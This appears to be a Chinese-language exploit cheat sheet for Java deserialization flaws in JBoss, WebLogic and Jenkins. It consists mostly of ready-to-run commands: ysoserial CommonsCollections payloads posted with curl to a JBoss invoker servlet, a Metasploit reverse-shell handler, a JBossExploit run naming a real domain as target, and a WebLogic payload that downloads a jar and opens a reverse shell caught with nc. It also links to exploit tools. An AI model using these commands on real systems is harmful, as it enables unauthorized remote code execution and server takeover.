## JavaDeserialization


###jboss：

#####一

```
▶ java -jar ysoserial-0.0.2-all.jar
Y SO SERIAL?  
Usage: java -jar ysoserial-[version]-all.jar [payload type] '[command to execute]'  
    Available payload types:  
        CommonsCollections1 #jboss用這個我測試過一次可行  
        CommonsCollections2 #剩下的沒測試過  
        Groovy1  
        Spring1  

▶ java -jar ysoserial-0.0.2-all.jar CommonsCollections1 'command' >/tmp/payload
▶ curl --header 'Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue' --data-binary '@/tmp/payload' http://127.0.0.1:8080/invoker/JMXInvokerServlet
```

[ysoserial-0.0.2-all.jar](https://github.com/frohoff/ysoserial/releases)  

####二  

session 1:

```
▶ssh kali
root@Kali:~# msfconsole
msf > use exploit/multi/handler
msf exploit(handler) > set payload linux/x86/shell/reverse_tcp
msf exploit(handler) > set LHOST 123.123.123.123
msf exploit(handler) > set LPORT 999
msf exploit(handler) > exploit
```

session 2:

```
▶ssh kali
root@Kali:~# java -jar JBossExploit.jar -lhost 123.123.123.123 -lport 999 -rhost baidu.com -rport 80 -srvport 4040
```

[JBossExploit](https://github.com/njfox/Java-Deserialization-Exploit)  

###weblogic：  

```
▶ javac -classpath commons-collections-3.2.jar Main.java
▶ java Main.class
```

Main.java的作用是生成一個從url下載jar包的payload，jar包執行反彈shell。  
已打包為weblogic.jar，iswin.jar下載地址為原作者提供的地址，有需要重新編譯源碼替換class就好。   
~~替換成[github](https://github.com/hackzx/JavaDeserialization/raw/master/iswin.jar)的就好。~~

```
usage:  
  java -jar weblogic.jar [ip/domain] [port] [out_payload_file]

```

```
▶ java -jar weblogic.jar [ReverseIP] 888 /tmp/payload
▶ python weblogic.py [TargetIP] 7001 /tmp/payload
▶ ssh kali
root@Kali:~# nc -vv -l -p 888
```

[weblogic.jar](https://github.com/hackzx/JavaDeserialization/raw/master/weblogic.jar)  
[commons-collections-3.2.jar](http://archive.apache.org/dist/commons/collections/binaries/commons-collections-3.2.zip "Main.jar依賴包")  
[Main.java](http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/ "TransformedMap的实现方式")  
[weblogic.py](https://github.com/schinkelg/JavaUnserializeExploits/blob/master/weblogic.py "自動添加包頭的修正腳本")

###jenkins

https://github.com/CaledoniaProject/jenkins-cli-exploit  


--

更多更多的鏈接：  
http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/  
http://www.secpulse.com/archives/40420.html  
http://www.iswin.org/2015/11/13/Apache-CommonsCollections-Deserialized-Vulnerability/  
https://github.com/foxglovesec/JavaUnserializeExploits  
https://github.com/njfox/Java-Deserialization-Exploit  
http://zone.wooyun.org/content/23905  